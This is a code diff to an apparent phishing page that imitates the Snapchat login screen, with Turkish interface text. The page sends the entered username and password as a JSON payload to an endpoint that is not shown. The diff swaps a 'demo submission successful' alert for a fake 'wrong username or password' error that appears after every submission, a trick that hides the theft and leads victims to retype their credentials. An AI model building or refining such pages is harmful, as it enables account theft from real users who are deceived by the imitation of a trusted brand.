@@ -9,41 +9,83 @@
       --snap-yellow:#fffc00;
       --ink:#111;
       --card:#fff;
-      --radius:18px;
-      --shadow:0 10px 30px rgba(0,0,0,.12);
+      --radius:24px;
+      --shadow:0 10px 30px rgba(0,0,0,.15);
+      --btn-shadow:0 6px 15px rgba(0,0,0,.2);
+      --error-red:#e84141;
     }
     *{box-sizing:border-box}
     body{
       margin:0;
-      font-family:system-ui,-apple-system,Segoe UI,Roboto,Helvetica,Arial;
+      font-family:'Arial Rounded MT Bold', Arial, sans-serif;
       background:linear-gradient(180deg,#fff799,#ffe400);
       min-height:100vh;
       display:flex;
       align-items:center;
       justify-content:center;
       padding:20px;
-      color:var(--ink)
+      color:var(--ink);
     }
     .wrap{width:100%;max-width:460px}
-    .card{background:var(--card);border-radius:20px;padding:22px;box-shadow:var(--shadow);overflow:hidden}
-    .brand{display:flex;align-items:center;gap:12px;justify-content:center;margin-bottom:8px}
-    .ghost{width:46px;height:46px;border-radius:50%;display:grid;place-items:center;background:var(--snap-yellow);border:2px solid var(--ink);font-size:26px}
-    h1{margin:0;font-size:22px}
-    form{display:grid;gap:12px;margin-top:8px}
+    .card{
+      background:var(--card);
+      border-radius:var(--radius);
+      padding:28px 24px;
+      box-shadow:var(--shadow);
+      overflow:hidden;
+      text-align:center;
+    }
+    .ghost{
+      width:80px;
+      height:80px;
+      border-radius:50%;
+      background:var(--snap-yellow) url('snap.png') center/cover no-repeat;
+      border:3px solid #fff;
+      margin:0 auto 12px auto;
+      box-shadow:0 4px 12px rgba(0,0,0,.2);
+    }
+    h1{margin:0;font-size:28px;color:#111}
+    form{display:grid;gap:14px;margin-top:16px}
     .field{position:relative}
-    .input{width:100%;padding:14px;border-radius:12px;border:2px solid #e8e8e8;font-size:15px;outline:none}
-    .input:focus{border-color:var(--ink);box-shadow:0 6px 18px rgba(0,0,0,.06)}
-    .btn{padding:12px;border-radius:12px;border:none;background:var(--ink);color:#fff;font-weight:700;cursor:pointer}
+    .input{
+      width:100%;
+      padding:16px;
+      border-radius:16px;
+      border:2px solid #eee;
+      font-size:16px;
+      outline:none;
+    }
+    .input:focus{border-color:var(--ink);box-shadow:0 0 0 4px rgba(0,0,0,.08)}
+    .btn{
+      padding:14px;
+      border-radius:16px;
+      border:none;
+      background:var(--ink);
+      color:#fff;
+      font-weight:700;
+      font-size:16px;
+      cursor:pointer;
+      box-shadow:var(--btn-shadow);
+      transition:transform .1s;
+    }
+    .btn:active{transform:translateY(2px)}
     .btn:disabled{opacity:.6;cursor:not-allowed}
+
+    /* Hata mesajı */
+    .error-message{
+      margin-top:10px;
+      color:var(--error-red);
+      font-weight:700;
+      display:none;
+      font-size:14px;
+    }
   </style>
 </head>
 <body>
   <div class="wrap">
-    <div class="card" role="main" aria-labelledby="title">
-      <div class="brand">
-        <div class="ghost" aria-hidden="true">👻</div>
-        <h1 id="title">Snapchat</h1>
-      </div>
+    <div class="card">
+      <div class="ghost"></div>
+      <h1>Snapchat</h1>
 
       <form id="loginForm" onsubmit="return handleSubmit(event)" autocomplete="on" novalidate>
         <div class="field">
@@ -55,6 +97,8 @@
         </div>
 
         <button class="btn" id="submitBtn" type="submit">Giriş Yap</button>
+
+        <div class="error-message" id="errorMessage">Kullanıcı adı veya şifre hatalı</div>
       </form>
     </div>
   </div>
@@ -65,6 +109,12 @@
 
     const form = document.getElementById('loginForm');
     const submitBtn = document.getElementById('submitBtn');
+    const errorMsg = document.getElementById('errorMessage');
+
+    function showError(){
+      errorMsg.style.display = 'block';
+      setTimeout(()=>{ errorMsg.style.display = 'none'; }, 3000);
+    }
 
     async function handleSubmit(e){
       e.preventDefault();
@@ -98,10 +148,12 @@
           body: JSON.stringify(payload)
         });
 
-        alert('Demo gönderimi başarılı.');
+        // Demo amaçlı hata göster
+        showError();
+
       } catch(err){
         console.error(err);
-        alert('Gönderim başarısız.');
+        showError();
       } finally {
         submitBtn.disabled = false;
       }
